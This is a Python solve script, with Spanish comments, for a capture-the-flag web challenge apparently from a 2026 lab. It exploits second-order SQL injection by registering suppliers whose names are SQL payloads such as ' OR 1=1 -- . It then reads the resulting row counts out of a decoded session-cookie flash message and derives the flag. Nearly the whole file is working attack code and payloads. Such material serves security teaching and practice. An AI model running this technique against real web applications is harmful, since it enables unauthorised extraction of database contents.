#!/usr/bin/env python3
# Cuentas Claras (HackLab 2026) - SQL injection de segundo orden via nombre de proveedor.
#
# /movimientos/<id> cuenta por el NOMBRE del proveedor, concatenado sin parametrizar:
#   SELECT COUNT(*) FROM movimientos WHERE proveedor = '<nombre>'
# Creamos proveedores cuyo nombre es el payload (en categoria permitida 'Papeleria',
# para pasar la whitelist del /alta) y leemos el conteo en el flash de la cookie.
#
# Ajustar BASE a la URL de la instancia vigente.
import base64, zlib, re, hashlib, urllib.request, urllib.parse

BASE = "https://REEMPLAZAR-POR-EL-HOST.b.softwareseguro.com.ar"

# Las 17 categorias permitidas (las del selector). Las 3 restringidas son el resto.
PERMITIDAS = ["Capacitacion","Catering","Consultoria","Insumos","Limpieza","Logistica",
              "Mantenimiento","Marketing","Mobiliario","Papeleria","Seguridad","Servicios",
              "Software","Tecnologia","Telefonia","Transporte","Viaticos"]


def _post(path, data):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(BASE + path, data=body, method="POST",
                                 headers={"User-Agent": "Mozilla/5.0"})
    return urllib.request.urlopen(req, timeout=30)


def _get(path):
    req = urllib.request.Request(BASE + path, headers={"User-Agent": "Mozilla/5.0"})
    return urllib.request.urlopen(req, timeout=30).read().decode("utf-8", "replace")


def decode_flash(set_cookie):
    m = re.search(r"session=([^;]+)", set_cookie or "")
    if not m:
        return ""
    tok = m.group(1).split(".")
    raw, comp = tok[0], False
    if raw == "":                      # payload comprimido con zlib (prefijo '.')
        raw, comp = tok[1], True
    s = raw.replace("-", "+").replace("_", "/")
    s += "=" * ((4 - len(s) % 4) % 4)
    d = base64.b64decode(s)
    return zlib.decompress(d).decode("utf-8", "replace") if comp else d.decode("utf-8", "replace")


def count_for_name(nombre):
    """Crea un proveedor con ese nombre (cat Papeleria), lo ubica y devuelve su conteo."""
    _post("/alta", {"nombre": nombre, "categoria": "Papeleria"})
    # el id del proveedor nuevo es el mayor de la tabla (primer idcol del HTML)
    html = _get("/")
    pid = re.findall(r'idcol">(\d+)</td>', html)[0]
    resp = _post("/movimientos/%s" % pid, {})
    flash = decode_flash(resp.headers.get("Set-Cookie", ""))
    m = re.search(r"#\d+: (-?\d+) mov", flash)
    return int(m.group(1)) if m else None


def main():
    in_list = ",".join("'%s'" % c for c in PERMITIDAS)

    total = count_for_name("' OR 1=1 -- ")
    permitidas = count_for_name("' OR categoria IN (%s) -- " % in_list)
    restringidas = count_for_name("' OR categoria NOT IN (%s) -- " % in_list)

    print("total movimientos       :", total)
    print("suma 17 permitidas      :", permitidas)
    print("suma 3 restringidas     :", restringidas)
    print("consistencia (t - p)    :", total - permitidas, "==", restringidas,
          "->", (total - permitidas) == restringidas)

    flag = hashlib.md5(str(restringidas).encode()).hexdigest()
    print("\nFLAG = MD5(%d) = %s" % (restringidas, flag))


if __name__ == "__main__":
    main()
